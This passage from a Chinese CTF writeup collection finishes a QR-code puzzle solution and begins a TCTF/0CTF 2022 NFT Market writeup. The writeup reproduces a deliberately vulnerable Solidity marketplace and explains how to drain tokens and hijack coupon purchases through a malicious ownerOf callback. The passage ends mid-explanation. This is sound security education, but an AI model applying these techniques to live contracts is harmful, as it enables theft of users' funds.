\u8fd9\u4e2a\u5305\u6765\u81ea\u52a8\u89e3\u4e8c\u7ef4\u7801 \u6539\u4e00\u6539 GZTime 2021 \u7965\u4e91\u676f\u7684 writeup \u91cc\u7684\u4ee3\u7801\uff1a \u4ee3\u7801 data = [ \"11111110101110011001001111111\" , \"10000010111110001101101000001\" , \"10111010111010111110001011101\" , # <- \u8fd9\u4e24\u884c\u9700\u8981\u624b\u52a8\u8c03\u6362\u5404\u8dd1\u4e00\u6b21 \"10111010000010001000001011101\" , \"10111010111000011000001011101\" , # <- \u8fd9\u4e24\u884c\u9700\u8981\u624b\u52a8\u8c03\u6362\u5404\u8dd1\u4e00\u6b21 \"10000010001100011010101000001\" , \"11111110101010101010101111111\" , \"00000000011111011001100000000\" , \"10011111111101000101110010111\" , \"11100001101100100001011010110\" , \"00111010110010101000000000010\" , \"10101101110101001110000110010\" , \"01110011010111001001011100001\" , \"10010100110101101111100111110\" , \"10111110011101011000011010111\" , \"00000000111001101011011111001\" , \"11001010001011011000000001000\" , \"11111100100110010010001011110\" , \"11001110110110010101100100001\" , \"00010001110001001101110001010\" , \"11011110111101111101111110100\" , \"00000000100100100101100011100\" , \"11111110100010100101101011100\" , \"10000010110010110100100011001\" , \"10111010100101100111111110100\" , \"10111010111001000110010100010\" , \"10111010001100010100110110111\" , \"10000010000111101111111111101\" , \"11111110101101010101110110000\" ] import pyzbar.pyzbar as pyzbar from itertools import permutations from PIL import Image , ImageDraw as draw import matplotlib.pyplot as plt from tqdm import tqdm shuffle_1 = [ 9 , 11 , 13 , 15 , 17 , 19 ] shuffle_2 = [ 10 , 12 , 14 , 16 , 18 ] head = data [: 9 ] tail = data [ 20 :] def body ( body_1 , body_2 ): # \u83b7\u53d6\u4e2d\u95f4\u90e8\u5206\u7684\u4e00\u79cd\u6392\u5217 body = [] for i in range ( 5 ): body . append ( body_1 [ i ]) body . append ( body_2 [ i ]) body . append ( body_1 [ 5 ]) return [ data [ i ] for i in body ] def draw_img ( data ): # \u751f\u6210\u4e8c\u7ef4\u7801\u56fe\u7247 assert len ( data ) == 29 and len ( data [ 0 ]) == 29 img = Image . new ( 'RGB' , ( 31 , 31 ), ( 255 , 255 , 255 )) for i , row in enumerate ( data ): for j , pixel in enumerate ( row ): img . putpixel (( j + 1 , i + 1 ), ( 0 , 0 , 0 ) if pixel == \"1\" else ( 255 , 255 , 255 )) return img with tqdm ( total = 86400 ) as pbar : for body_1 in permutations ( shuffle_1 ): for body_2 in permutations ( shuffle_2 ): im = draw_img ( head + body ( body_1 , body_2 ) + tail ) barcodes = pyzbar . decode ( im ) pbar . update ( 1 ) if ( len ( barcodes ) == 0 ): continue for barcode in barcodes : barcodeData = barcode . data . decode ( \"utf-8\" ) print ( barcodeData ) plt . imshow ( im ) plt . show () \u53ef\u4ee5\u8dd1\u51fa\u53ef\u89e3\u7684\u4e8c\u7ef4\u7801\u548c flag\uff1a flag\uff1amsc{You_ar3_g0od_4t_QR_Code}","title":"\u6df7\u4e71\u7684\u4e8c\u7ef4\u7801"},{"location":"writeups/tctf2022/","text":"TCTF/0CTF 2022 RisingStar Writeup \u00b6 Abstract TCTF/0CTF 2022 \u7684\u65b0\u661f\u8d5b\u9053\u548c\u56fd\u9645\u8d5b\u9053\uff0cmisc \u9898\u6709\u56db\u9053\u662f\u540c\u4e00\u4e2a\u9644\u4ef6\u7684\u56db\u4e2a flag\uff0c\u5f88 reverse\uff0c\u6ca1\u600e\u4e48\u505a\u3002\u53ea\u548c\u56db\u8001\u5e08\u4e00\u8d77\u505a\u4e86 ETH \u7684\u9898\uff0c\u8fd8\u662f\u6bd4\u8f83\u6709\u8da3\u7684 TCTF NFT Market \u00b6 \u9898\u76ee\u5408\u7ea6 // SPDX-License-Identifier: UNLICENSED pragma solidity 0.8.15 ; import \"@openzeppelin/contracts/token/ERC721/ERC721.sol\" ; import \"@openzeppelin/contracts/token/ERC20/ERC20.sol\" ; import \"@openzeppelin/contracts/access/Ownable.sol\" ; contract TctfNFT is ERC721 , Ownable { constructor () ERC721 ( \"TctfNFT\" , \"TNFT\" ) { _setApprovalForAll ( address ( this ), msg.sender , true ); } function mint ( address to , uint256 tokenId ) external onlyOwner { _mint ( to , tokenId ); } } contract TctfToken is ERC20 { bool airdropped ; constructor () ERC20 ( \"TctfToken\" , \"TTK\" ) { _mint ( address ( this ), 100000000000 ); _mint ( msg.sender , 1337 ); } function airdrop () external { require ( ! airdropped , \"Already airdropped\" ); airdropped = true ; _mint ( msg.sender , 5 ); } } struct Order { address nftAddress ; uint256 tokenId ; uint256 price ; } struct Coupon { uint256 orderId ; uint256 newprice ; address issuer ; address user ; bytes reason ; } struct Signature { uint8 v ; bytes32 [ 2 ] rs ; } struct SignedCoupon { Coupon coupon ; Signature signature ; } contract TctfMarket { event SendFlag (); event NFTListed ( address indexed seller , address indexed nftAddress , uint256 indexed tokenId , uint256 price ); event NFTCanceled ( address indexed seller , address indexed nftAddress , uint256 indexed tokenId ); event NFTBought ( address indexed buyer , address indexed nftAddress , uint256 indexed tokenId , uint256 price ); bool tested ; TctfNFT public tctfNFT ; TctfToken public tctfToken ; CouponVerifierBeta public verifier ; Order [] orders ; constructor () { tctfToken = new TctfToken (); tctfToken . approve ( address ( this ), type ( uint256 ). max ); tctfNFT = new TctfNFT (); tctfNFT . mint ( address ( tctfNFT ), 1 ); tctfNFT . mint ( address ( this ), 2 ); tctfNFT . mint ( address ( this ), 3 ); verifier = new CouponVerifierBeta (); orders . push ( Order ( address ( tctfNFT ), 1 , 1 )); orders . push ( Order ( address ( tctfNFT ), 2 , 1337 )); orders . push ( Order ( address ( tctfNFT ), 3 , 13333333337 )); } function getOrder ( uint256 orderId ) public view returns ( Order memory order ) { require ( orderId < orders . length , \"Invalid orderId\" ); order = orders [ orderId ]; } function createOrder ( address nftAddress , uint256 tokenId , uint256 price ) external returns ( uint256 ) { require ( price > 0 , \"Invalid price\" ); require ( isNFTApprovedOrOwner ( nftAddress , msg.sender , tokenId ), \"Not owner\" ); orders . push ( Order ( nftAddress , tokenId , price )); emit NFTListed ( msg.sender , nftAddress , tokenId , price ); return orders . length - 1 ; } function cancelOrder ( uint256 orderId ) external { Order memory order = getOrder ( orderId ); require ( isNFTApprovedOrOwner ( order . nftAddress , msg.sender , order . tokenId ), \"Not owner\" ); _deleteOrder ( orderId ); emit NFTCanceled ( msg.sender , order . nftAddress , order . tokenId ); } function purchaseOrder ( uint256 orderId ) external { Order memory order = getOrder ( orderId ); _deleteOrder ( orderId ); IERC721 nft = IERC721 ( order . nftAddress ); address owner = nft . ownerOf ( order . tokenId ); tctfToken . transferFrom ( msg.sender , owner , order . price ); nft . safeTransferFrom ( owner , msg.sender , order . tokenId ); emit NFTBought ( msg.sender , order . nftAddress , order . tokenId , order . price ); } function purchaseWithCoupon ( SignedCoupon calldata scoupon ) external { Coupon memory coupon = scoupon . coupon ; require ( coupon . user == msg.sender , \"Invalid user\" ); require ( coupon . newprice > 0 , \"Invalid price\" ); verifier . verifyCoupon ( scoupon ); Order memory order = getOrder ( coupon . orderId ); _deleteOrder ( coupon . orderId ); IERC721 nft = IERC721 ( order . nftAddress ); address owner = nft . ownerOf ( order . tokenId ); tctfToken . transferFrom ( coupon . user , owner , coupon . newprice ); nft . safeTransferFrom ( owner , coupon . user , order . tokenId ); emit NFTBought ( coupon . user , order . nftAddress , order . tokenId , coupon . newprice ); } function purchaseTest ( address nftAddress , uint256 tokenId , uint256 price ) external { require ( ! tested , \"Tested\" ); tested = true ; IERC721 nft = IERC721 ( nftAddress ); uint256 orderId = TctfMarket ( this ). createOrder ( nftAddress , tokenId , price ); nft . approve ( address ( this ), tokenId ); TctfMarket ( this ). purchaseOrder ( orderId ); } function win () external { require ( tctfNFT . ownerOf ( 1 ) == msg.sender && tctfNFT . ownerOf ( 2 ) == msg.sender && tctfNFT . ownerOf ( 3 ) == msg.sender ); emit SendFlag (); } function isNFTApprovedOrOwner ( address nftAddress , address spender , uint256 tokenId ) internal view returns ( bool ) { IERC721 nft = IERC721 ( nftAddress ); address owner = nft . ownerOf ( tokenId ); return ( spender == owner || nft . isApprovedForAll ( owner , spender ) || nft . getApproved ( tokenId ) == spender ); } function _deleteOrder ( uint256 orderId ) internal { orders [ orderId ] = orders [ orders . length - 1 ]; orders . pop (); } function onERC721Received ( address , address , uint256 , bytes memory ) public pure returns ( bytes4 ) { return this . onERC721Received . selector ; } } contract CouponVerifierBeta { TctfMarket market ; bool tested ; constructor () { market = TctfMarket ( msg.sender ); } function verifyCoupon ( SignedCoupon calldata scoupon ) public { require ( ! tested , \"Tested\" ); tested = true ; Coupon memory coupon = scoupon . coupon ; Signature memory sig = scoupon . signature ; Order memory order = market . getOrder ( coupon . orderId ); bytes memory serialized = abi . encode ( \"I, the issuer\" , coupon . issuer , \"offer a special discount for\" , coupon . user , \"to buy\" , order , \"at\" , coupon . newprice , \"because\" , coupon . reason ); IERC721 nft = IERC721 ( order . nftAddress ); address owner = nft . ownerOf ( order . tokenId ); require ( coupon . issuer == owner , \"Invalid issuer\" ); require ( ecrecover ( keccak256 ( serialized ), sig . v , sig . rs [ 0 ], sig . rs [ 1 ]) == coupon . issuer , \"Invalid signature\" ); } } \u5408\u7ea6\u5f88\u590d\u6742\uff0c\u4e0b\u9762\u8be6\u7ec6\u5206\u6790\u4e00\u4e0b\uff1a \u6709\u4e00\u4e2a\u57fa\u4e8e ERC20 \u7684\u4ee3\u5e01 TctfToken\uff08TTK\uff09 \u5728\u521b\u5efa\u65f6\u4f1a\u7ed9\u81ea\u5df1\u5408\u7ea6\u53d1\u653e 100000000000 \u4e2a\u4ee3\u5e01\uff0c\u7ed9\u90e8\u7f72\u8005\u53d1\u653e 1337 \u4e2a\u4ee3\u5e01 \u6709\u7a7a\u6295\u65b9\u6cd5\uff0c\u5916\u90e8\u53ef\u4ee5\u76f4\u63a5\u8c03\u7528\uff0c\u4e0d\u8fc7\u53ea\u80fd\u8c03\u7528\u4e00\u6b21\uff0c\u4e14\u4e00\u6b21\u53ea\u80fd\u83b7\u5f97 5 \u4e2a\u4ee3\u5e01 \u6709\u4e00\u4e2a\u57fa\u4e8e ERC721 \u7684\u975e\u540c\u8d28\u5316\u4ee3\u5e01\uff08NFT\uff09TctfNFT NFT \u7684\u5b9e\u8d28\u5c31\u662f\u53ef\u4ee5\u4e0b\u53d1\u5f88\u591a\u79cd\u4ee3\u5e01\uff08tokenId\uff09\uff0c\u4e0d\u8fc7\u6bcf\u79cd\u53ea\u80fd\u6709\u4e00\u4e2a\uff0c\u56e0\u6b64\u5728 mint \u7684\u65f6\u5019\u7b2c\u4e8c\u4e2a\u53c2\u6570\u4ee3\u8868\u7684\u662f\u7f16\u53f7\u800c\u4e0d\u662f ERC20 \u4e2d\u7684\u6570\u91cf \u53ea\u6709 owner \u53ef\u4ee5\u4e0b\u53d1\u65b0\u4ee3\u5e01 \u6709\u4e00\u4e9b\u7ed3\u6784\u4f53 Order\uff1a\u4fdd\u5b58\u4e86\u8ba2\u5355\u4fe1\u606f\uff0c\u5305\u542b NFT \u5408\u7ea6\u5730\u5740\u3001\u552e\u5356\u7684\u4ee3\u5e01 id\u3001\u552e\u5356\u7684\u4ef7\u683c Coupon\uff1a\u4fdd\u5b58\u4e86\u4e00\u4e2a\u4f18\u60e0\u5238\uff0c\u5305\u542b\u4e86\u8ba2\u5355\u7f16\u53f7\u3001\u4f18\u60e0\u540e\u7684\u4ef7\u683c\u3001\u4e0b\u53d1\u4f18\u60e0\u5238\u7684\u8d26\u6237\u5730\u5740\u3001\u4f7f\u7528\u4f18\u60e0\u5238\u7684\u8d26\u6237\u5730\u5740\u3001\u4f18\u60e0\u7406\u7531 \u26a0\ufe0f \u8fd9\u91cc\u6709\u4e00\u4e2a\u53ef\u7591\u7684\u5730\u65b9\uff0c\u5b83\u4fdd\u5b58\u7684\u662f\u8ba2\u5355\u7f16\u53f7\u800c\u4e0d\u662f\u4ee3\u5e01\u7f16\u53f7\uff0c\u4f1a\u51fa\u73b0\u95ee\u9898 Signature\uff1a\u4fdd\u5b58\u4e86\u7b7e\u540d\u4fe1\u606f\uff08web3 \u7b7e\u540d\u5f97\u5230\u7684 v\u3001r\u3001s\uff09 SignedCoupon\uff1a\u4fdd\u5b58\u4e86\u4e00\u4e2a\u4f18\u60e0\u5238\u548c\u5bf9\u5e94\u7684\u7b7e\u540d \u6709\u4e00\u4e2a\u4ea4\u6613\u5546\u573a\u5408\u7ea6 TctfMarket \u6784\u9020\u65b9\u6cd5\uff1a \u5148\u521b\u5efa\u4e00\u4e2a TctfToken \u5408\u7ea6\u8d26\u6237\uff0c\u5e76\u5141\u8bb8\u5f53\u524d\u5546\u573a\u5408\u7ea6\u4efb\u610f\u4f7f\u7528\u6240\u62e5\u6709\u7684\u4ee3\u5e01 \u5f53\u524d\u5546\u573a\u56e0\u4e3a\u90e8\u7f72\u4e86\u5408\u7ea6\u4f1a\u88ab\u5206\u5230 1337 TTK \u7136\u540e\u521b\u5efa\u4e00\u4e2a TctfNFT \u5408\u7ea6\u8d26\u6237\uff0c\u5e76\u4e0b\u53d1\u4e09\u4e2a NFT \u4ee3\u5e01\uff1a 1 \u53f7 NFT \u53d1\u653e\u7ed9 TctfNFT \u5408\u7ea6\u8d26\u6237 2 \u53f7\u30013 \u53f7 NFT \u53d1\u653e\u7ed9\u5f53\u524d\u5546\u573a\u8d26\u6237 \u521b\u5efa\u4e00\u4e2a verifier\uff08\u540e\u9762\u518d\u5206\u6790\uff09 \u521b\u5efa\u4e09\u4e2a\u8ba2\u5355\uff1a 1 \u53f7\u4ee3\u5e01\u4ee5 1 TTK \u7684\u4ef7\u683c\u552e\u5356\uff08airdrop \u4e4b\u540e\u53ef\u4ee5\u76f4\u63a5\u8d2d\u4e70\uff09 2 \u53f7\u4ee3\u5e01\u4ee5 1337 TTK \u7684\u4ef7\u683c\u552e\u5356 \u26a0\ufe0f \u7ed3\u5408\u524d\u9762\u5546\u573a\u5f97\u5230\u4e86 1337 TTK \u7684\u6697\u793a\uff0c\u53ef\u4ee5\u77e5\u9053\u8fd9\u4e2a\u4ee3\u5e01\u9700\u8981\u5148\u9a97\u53d6\u5546\u573a\u7684\u94b1 3 \u53f7\u4ee3\u5e01\u4ee5 13333333337 TTK \u7684\u4ef7\u683c\u552e\u5356 \u26a0\ufe0f \u4ef7\u683c\u5f88\u9ad8\uff0c\u6240\u4ee5\u53ef\u4ee5\u731c\u5230\u9700\u8981\u4f7f\u7528\u4f18\u60e0\u5238\u6765\u964d\u4f4e\u4ef7\u683c \u901a\u8fc7\u65b9\u6cd5\uff1a win \u65b9\u6cd5\u4e2d\u5b9a\u4e49\uff08\u672b\u5c3e emit \u4e86 SendFlag \u4e8b\u4ef6\uff09 \u68c0\u67e5\u8c03\u7528\u8005\u662f\u5426\u62e5\u6709\u5168\u90e8\u4e09\u4e2a\u4ee3\u5e01\uff0c\u5982\u679c\u6709\u5219\u6210\u529f getOrder \u65b9\u6cd5\uff1a\u83b7\u53d6\u8ba2\u5355\uff0c\u4e0d\u5fc5\u591a\u8bf4 createOrder \u65b9\u6cd5 \u63a5\u6536\u4e00\u4e2a NFT \u5408\u7ea6\u8d26\u6237\u5730\u5740\uff0c\u552e\u5356\u7684 tokenId \u548c\u4ef7\u683c \u521b\u5efa\u8ba2\u5355\u7684\u8d26\u6237\uff08\u5373\u8c03\u7528\u6b64\u65b9\u6cd5\u7684\u8d26\u6237\uff09\u5fc5\u987b\u662f\u6240\u552e\u5356\u4ee3\u5e01\u7684 owner\uff0c\u6216\u8005\u88ab\u6240\u6709\u8005\u8d4b\u4e88\u4e86\u7ba1\u7406\u6b64\u4ee3\u5e01\u7684\u6743\u9650\uff0c\u6216\u8005\u88ab\u6240\u6709\u8005\u8d4b\u4e88\u4e86\u7ba1\u7406\u4ed6\u6240\u6709\u4ee3\u5e01\u7684\u6743\u9650\uff08\u5728 isNFTApprovedOrOwner \u65b9\u6cd5\u4e2d\u68c0\u67e5\uff09 \u26a0\ufe0f \u6b64\u5904\u6709\u4e00\u4e2a\u95ee\u9898\uff0c\u521b\u5efa\u8ba2\u5355\u7684 NFT \u5408\u7ea6\u5730\u5740\u5e76\u6ca1\u6709\u786c\u7f16\u7801\u4e3a\u5546\u573a\u521b\u5efa\u7684 NFT \u5730\u5740\uff0c\u800c\u662f\u53ef\u4ee5\u901a\u8fc7\u7528\u6237\u81ea\u884c\u8f93\u5165\uff0c\u4f1a\u6709\u95ee\u9898 \u26a0\ufe0f \u6b64\u5904\u8fd8\u6709\u4e00\u4e2a\u95ee\u9898\uff0c\u8fd9\u4e2a\u65b9\u6cd5\u662f external \u7684\uff0c\u4e5f\u5c31\u662f\u8bf4\u5916\u90e8\u7684\u4efb\u4f55\u4eba\u90fd\u53ef\u4ee5\u8c03\u7528\u8fd9\u4e2a\u65b9\u6cd5\u6765\u521b\u5efa\u8ba2\u5355 cancelOrder \u65b9\u6cd5 \u548c createOrder \u65b9\u6cd5\u540c\u6837\u68c0\u67e5\u4e86\u6743\u9650 \u8c03\u7528\u4e86 internal \u7684 _deleteOrder \u65b9\u6cd5\uff1a \u5c06\u672b\u5c3e\u7684\u8ba2\u5355\u79fb\u52a8\u5230\u5f53\u524d\u8981\u5220\u9664\u7684\u4f4d\u7f6e\u7136\u540e\u5f39\u51fa\u672b\u5c3e\u8ba2\u5355 \u26a0\ufe0f \u8fd9\u91cc\u4f1a\u5bfc\u81f4\u8ba2\u5355\u987a\u5e8f\u4e71\u5e8f\uff0c\u7ed3\u5408\u524d\u9762\u4f18\u60e0\u5238\u4fdd\u5b58\u7684\u662f\u8ba2\u5355\u7f16\u53f7\uff0c\u4f1a\u5bfc\u81f4\u4f18\u60e0\u5238\u5b9e\u9645\u4f5c\u7528\u4ee3\u5e01\u53d1\u751f\u53d8\u5316\uff0c\u662f\u4e2a\u5927\u95ee\u9898 \u6709\u4e09\u79cd\u652f\u4ed8\u8ba2\u5355\uff08\u8d2d\u4e70\u4ee3\u5e01\uff09\u7684\u65b9\u6cd5\uff1a purchaseOrder \u539f\u4ef7\u8d2d\u4e70\uff1a \u53ef\u4ee5\u8c03\u7528\u65e0\u9650\u6b21 \u76f4\u63a5\u652f\u4ed8\uff0c\u5148\u5220\u9664\u8ba2\u5355\u9632\u6b62\u91cd\u5165 \u5148\u4ece\u8c03\u7528\u8005\uff08\u4e70\u5bb6\uff09\u8f6c order.price \u4e2a TTK \u7ed9\u4ee3\u5e01\u6240\u6709\u8005 \u26a0\ufe0f \u8fd9\u91cc\u4e5f\u6709\u95ee\u9898\uff0cToken \u7684\u63a5\u6536\u65b9\u53ea\u4f1a\u662f owner\uff0c\u800c\u4e0d\u4f1a\u662f\u5176\u5b83\u88ab approved \u7684\u8d26\u6237\uff08\u6bd4\u5982\u8ba2\u5355\u521b\u5efa\u8005\uff09 \u518d\u4ece\u4ee3\u5e01\u6240\u6709\u8005\u8f6c\u51fa\u8fd9\u4e2a\u4ee3\u5e01\uff08order.tokenId\uff09\u7ed9\u8c03\u7528\u8005\uff08\u4e70\u5bb6\uff09 purchaseTest\uff1a \u53ea\u80fd\u8c03\u7528\u4e00\u6b21 \u26a0\ufe0f \u770b\u540d\u5b57\u662f\u6d4b\u8bd5\u7528\u65b9\u6cd5\uff0c\u5f88\u53ef\u7591\uff0c\u5e94\u8be5\u4f1a\u5305\u542b\u6f0f\u6d1e \u5177\u4f53\u903b\u8f91\u548c purchaseOrder \u5dee\u4e0d\u591a \u8c03\u7528\u8005\u53ef\u4ee5\u6307\u5b9a NFT \u5408\u7ea6\u5730\u5740\u3001tokenId \u548c\u4ef7\u683c \u5148\u521b\u5efa\u8ba2\u5355\u7136\u540e\u8df3\u7528 purchaseOrder \u8d2d\u4e70 purchaseWithCoupon \u4f7f\u7528\u4f18\u60e0\u5238\u8d2d\u4e70\uff1a \u53ea\u80fd\u8c03\u7528\u4e00\u6b21\uff08CouponVerifierBeta \u7684\u539f\u56e0\uff09 \u4f20\u5165\u4e00\u4e2a SignedCoupon \u901a\u8fc7 verifier.verifyCoupon \u9a8c\u8bc1\u6743\u9650\u548c\u7b7e\u540d \u901a\u8fc7 coupon.orderId \u53d6\u51fa\u8ba2\u5355\u5e76\u5220\u9664 \u26a0\ufe0f \u8fd9\u91cc\u6709\u95ee\u9898\uff0c\u53d6\u51fa\u8ba2\u5355\u7684\u64cd\u4f5c\u5728\u9a8c\u8bc1\u4e4b\u540e\uff0c\u5982\u679c\u80fd\u591f\u5728\u9a8c\u8bc1\u65f6\u641e\u4e9b\u624b\u6bb5\u5219\u53ef\u4ee5\u8ba9\u540e\u9762\u83b7\u5f97\u7684\u8ba2\u5355\u662f\u53e6\u4e00\u4e2a\u8ba2\u5355 \u4ee5 purchaseOrder \u540c\u6837\u903b\u8f91\u552e\u5356\uff08\u4ee5 coupon.newprice \u4ef7\u683c\uff09 onERC721Received \u65b9\u6cd5\uff1a \u9700\u8981\u8fd4\u56de selector \u6765\u8868\u793a\u8fd9\u662f\u4e00\u4e2a\u53ef\u7591\u63a5\u6536 ERC721 \u4ee3\u5e01\u7684\u5408\u7ea6\u8d26\u6237\uff08\u5728 safeTransferFrom \u65f6\u8c03\u7528\u68c0\u67e5\uff09 \u66fe\u7ecf\u6709\u6f0f\u6d1e\u662f\u5229\u7528\u8fd9\u4e2a\u51fd\u6570\u7684\u7279\u6027\u6765\u5728\u91cc\u9762\u641e\u5c0f\u52a8\u4f5c\u5b9e\u73b0\u91cd\u5165\u653b\u51fb\uff0c\u4e0d\u8fc7\u672c\u5408\u7ea6\u5df2\u7ecf\u9632\u6b62\u4e86\u91cd\u5165 \u6709\u4e00\u4e2a\u4f18\u60e0\u5238\u7b7e\u540d\u9a8c\u8bc1\u5408\u7ea6 CouponVerifierBeta\uff1a \u26a0\ufe0f \u540c\u6837\u540d\u5b57\u91cc\u5e26\u4e86 Beta\uff0c\u5f88\u53ef\u7591 verifyCoupon \u65b9\u6cd5\uff1a \u53ea\u80fd\u8c03\u7528\u4e00\u6b21 \u63a5\u6536\u4e00\u4e2a SignedCoupon \u53d6\u51fa coupon\u3001\u7b7e\u540d\u3001\u8ba2\u5355 \u6784\u9020 serialized bytes \u4fe1\u606f \u9a8c\u8bc1 issuer \u662f\u5426\u662f\u6240\u4f18\u60e0\u7684\u4ee3\u5e01\u7684 owner \u26a0\ufe0f \u6b64\u5904\u6709\u95ee\u9898\uff0c\u8c03\u7528\u4e86 NFT \u5730\u5740\u4e0a\u7684 ownerOf \u65b9\u6cd5\uff0c\u4e0d\u8fc7\u8fd9\u4e2a NFT \u5730\u5740\u53ef\u4ee5\u662f\u7528\u6237\u81ea\u884c\u521b\u5efa\u8ba2\u5355\u65f6\u6307\u5b9a\u7684\uff0c\u5176 ownerOf \u65b9\u6cd5\u4e5f\u5e76\u4e0d\u53ef\u4fe1 \u9a8c\u8bc1\u9488\u5bf9 keccak256(serialized) \u7684\u7b7e\u540d sig \u662f\u5426\u662f issuer \u7b7e\u7f72\u7684 \u5206\u6790\u4e0b\u6765\u5df2\u7ecf\u5f97\u5230\u4e86\u5f88\u591a\u7591\u70b9\u548c\u6709\u6f0f\u6d1e\u7684\u5730\u65b9\uff0c\u4e09\u4e2a\u4ee3\u5e01\u7684\u83b7\u53d6\u65b9\u6cd5\u4e5f\u5c31\u57fa\u672c\u6e05\u6670\u4e86\uff1a 1 \u53f7\u4ee3\u5e01\u901a\u8fc7 airdrop \u62ff\u5230 5 TTK \u540e\u53ef\u4ee5\u76f4\u63a5\u8d2d\u4e70 2 \u53f7\u4ee3\u5e01\u901a\u8fc7 purchaseTest \u65b9\u6cd5\u7684\u6f0f\u6d1e\u9a97\u53d6 1337 TTK \u540e\u8d2d\u4e70 \u5148\u521b\u5efa\u4e00\u4e2a\u81ea\u5df1\u7684 TctfNFT \u5408\u7ea6 \u7ed9\u81ea\u5df1\u53d1\u653e\u4e00\u4e2a\u4ee3\u5e01 \u5c06\u81ea\u5df1\u7684\u6743\u9650\u5168\u6743\u4ee3\u7406\u7ed9\u5546\u573a \u8c03\u7528 puchaseTest \u65b9\u6cd5\uff0c\u4f20\u5165\u81ea\u5df1\u5efa\u7684 NFT \u5408\u7ea6\u5730\u5740\u3001\u53d1\u653e\u7684\u4ee3\u5e01\u7f16\u53f7\u30011337 TTK \u7684\u4ef7\u683c \u8fd9\u65f6\u91cc\u9762\u4f1a\u521b\u5efa\u8fd9\u4e2a\u8ba2\u5355\u5e76\u4e14\u81ea\u5df1\u8d2d\u4e70 \u4e0d\u8fc7\u81ea\u5df1\u8d2d\u4e70\u65f6\u6536\u6b3e\u65b9\u5e76\u4e0d\u662f\u81ea\u5df1\uff0c\u800c\u662f\u8fd9\u4e2a\u4ee3\u5e01\u7684 owner\uff0c\u4e5f\u5c31\u662f\u6211\u4eec\u7684\u8d26\u6237\uff0c\u6240\u4ee5\u5c31\u9a97\u5230\u4e86 1337 TTK \uff08\u4e0d\u901a\u8fc7\u5df2\u4e70\u7684 1 \u53f7\u4ee3\u5e01\u9a97\u94b1\u7684\u539f\u56e0\u662f\u8fd9\u6837\u4f1a\u5bfc\u81f4 1 \u53f7\u4ee3\u5e01\u65e0\u6cd5\u518d\u56de\u6536\uff09 3 \u53f7\u4ee3\u5e01\u901a\u8fc7 CouponVerifierBeta \u7684\u6f0f\u6d1e\uff0c\u5728 ownerOf \u91cc\u8c03\u7528\u5220\u9664\u8ba2\u5355\u4f7f\u8ba2\u5355\u961f\u5217\u4e71\u5e8f\uff0c\u4ece\u800c\u7528\u6b63\u786e\u7684\u4f18\u60e0\u5238\u548c\u4ef7\u683c\u4e70\u5230\u5176\u5b83\u8ba2\u5355\u4e2d\u7684\u4ee3\u5e01 1\u30012 \u53f7\u83b7\u53d6\u7684\u6d41\u7a0b\u5df2\u7ecf\u5f88\u6e05\u6670\u4e86\uff0c\u800c\u4e14\u5176\u987a\u5e8f\u5e76\u4e0d\u5f71\u54cd\uff0c\u53ef\u4ee5\u968f\u65f6\u901a\u8fc7\u5bf9\u5e94\u65b9\u6cd5\u83b7\u5f97\u3002\u4e0b\u9762\u4e3b\u8981\u8bf4 3 \u53f7\u4ee3\u5e01\uff0c\u4e5f\u5c31\u662f\u6700\u7cbe\u5f69\u7684\u90e8\u5206\uff1a \u8fd9\u4e2a\u4ee3\u5e01\u7684\u83b7\u53d6\u65b9\u6cd5\u80af\u5b9a\u662f\u901a\u8fc7 purchaseWithCoupon \u65b9\u6cd5\uff0c\u518d\u634b\u4e00\u4e0b\u8c03\u7528\u7684\u6574\u4e2a\u8fc7\u7a0b\uff1a \u53d6\u51fa\u53c2\u6570\u4e2d\u7684 coupon \u9a8c\u8bc1 user\uff08\u4f7f\u7528\u8005\uff09\u662f\u5426\u662f\u8c03\u7528\u8005\uff0cnewprice \u662f\u5426\u5927\u4e8e 0 \u8c03\u7528 verifier.verifyCoupon \u65b9\u6cd5 \u53d6\u51fa coupon\u3001sig\u3001order\uff08\u8ba2\u5355\u5168\u90e8\u5185\u5bb9\uff09 \u6784\u9020\u5e8f\u5217\u5316\u4fe1\u606f \u8c03\u7528 order.nftAddress \u4e0a\u7684 ownerOf \u65b9\u6cd5\u83b7\u5f97 owner \u9a8c\u8bc1 issuer\uff08\u4e0b\u53d1\u4f18\u60e0\u5238\u7684\u4eba\uff09\u662f\u5426\u662f owner \u9a8c\u8bc1\u7b7e\u540d\u662f\u5426\u662f issuer \u4e3a\u5e8f\u5217\u5316\u4fe1\u606f\u7b7e\u7f72\u7684 \u6839\u636e coupon.orderId \u53d6\u51fa\u5e76\u5220\u9664\u8ba2\u5355 \u8c03\u7528 order.nftAddress \u4e0a\u7684 ownerOf \u65b9\u6cd5\u83b7\u5f97 owner coupon.user \u5411 owner \u8f6c coupon.newprice \u4e2a TTK owner \u5c06 order.tokenId \u8fd9\u4e2a\u4ee3\u5e01\u8f6c\u7ed9 coupon.user \u5176\u4e2d coupon \u63d0\u53d6\u7684\u65f6\u673a\u5f88\u5173\u952e\uff1a \u5728 purchaseWithCoupon \u65b9\u6cd5\u5f00\u5934\u5c31\u63d0\u53d6\u4e86 coupon \u5168\u90e8\u5185\u5bb9\u5230\u5185\u5b58\u4e2d\uff0c\u56e0\u6b64 verifier.verifyCoupon \u8fd4\u56de\u540e coupon.orderId\u3001coupon.user \u4e0d\u4f1a\u53d8 \u5728 verifier.verifyCoupon \u65b9\u6cd5\u4e2d\u4e5f\u662f\u5f00\u5934\u5c31\u63d0\u53d6\u4e86 coupon \u5168\u90e8\u5185\u5bb9\uff0c\u5e76\u5728 ownerOf \u8c03\u7528\u524d\u5c31\u521b\u5efa\u4e86\u5bf9\u5e94\u7684\u5e8f\u5217\u5316\u4fe1\u606f \u9519\u8bef\u7684\u65b9\u6cd5 \u6240\u4ee5\u53ea\u8981\u6211\u4eec\u521b\u5efa\u4e00\u4e2a\u81ea\u5df1\u7684\u8ba2\u5355\uff08nftAddress \u662f\u81ea\u5df1\u90e8\u7f72\u7684\u6709\u95ee\u9898\u7684\u5408\u7ea6\uff09\uff0c\u901a\u8fc7\u67d0\u4e9b\u65b9\u6cd5\u8ba9\u5176\u987a\u5e8f\u53d8\u5230 3 \u53f7\u4ee3\u5e01\u5bf9\u5e94\u8ba2\u5355\u4e4b\u524d\u3002\u8fd9\u6837\u5c31\u53ef\u4ee5\u5728 verifier.verifyCoupon \u65b9\u6cd5\u4e2d\u8c03\u7528 ownerOf \u65f6\u5728\u5176\u5185\u90e8\u5220\u9664\u6389\u8fd9\u4e2a\u8ba2\u5355\uff0c\u5bfc\u81f4\u540e\u9762\u901a\u8fc7 getOrder(coupon.orderId).tokenId \u83b7\u53d6\u5230\u7684\u5b9e\u9645\u4e0a\u662f 